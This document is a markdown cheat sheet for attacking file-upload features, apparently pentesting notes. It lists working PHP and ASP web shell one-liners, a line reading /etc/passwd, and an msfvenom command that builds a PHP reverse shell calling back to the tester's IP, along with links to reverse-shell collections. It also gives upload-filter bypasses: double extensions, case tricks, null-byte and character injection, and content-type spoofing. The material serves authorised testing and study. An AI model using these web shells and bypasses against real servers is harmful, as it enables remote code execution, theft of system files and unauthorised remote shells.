# Web Shells

## Web Shell	Description
| Web Shell                                               | Description                           |
|---------------------------------------------------------|---------------------------------------|
| `<?php file_get_contents('/etc/passwd'); ?>`           | Basic PHP File Read                   |
| `<?php system('hostname'); ?>`                         | Basic PHP Command Execution           |
| `<?php system($_REQUEST['cmd']); ?>`                   | Basic PHP Web Shell                   |
| `<% eval request('cmd') %>`                             | Basic ASP Web Shell                   |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell |
| [PHP Web Shell](https://github.com/Arrexel/phpbash)                                           | PHP Web Shell                         |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)                                       | PHP Reverse Shell                     |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)                                      | List of Web Shells and Reverse Shells|

# Bypasses

## Client-Side Bypass	
- [CTRL+SHIFT+C]	Toggle Page Inspector

## Blacklist Bypass	
- `shell.phtml`	Uncommon Extension
- `shell.pHp`	Case Manipulation

## PHP Extensions	
- [List of PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)

## ASP Extensions	
- [List of ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)

## Web Extensions	
- [List of Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)

## Whitelist Bypass	
- `shell.jpg.php`	Double Extension
- `shell.php.jpg`	Reverse Double Extension
- `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, …	Character Injection - Before/After Extension

## Content/Type Bypass	
- [Web Content-Types	List of Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
- [Content-Types	List of All Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)
- [File Signatures	List of File Signatures/Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)

## Limited Uploads
| Potential Attack | File Types            |
|------------------|-----------------------|
| XSS              | HTML, JS, SVG, GIF   |
| XXE/SSRF         | XML, SVG, PDF, PPT, DOC |
| DoS              | ZIP, JPG, PNG        |
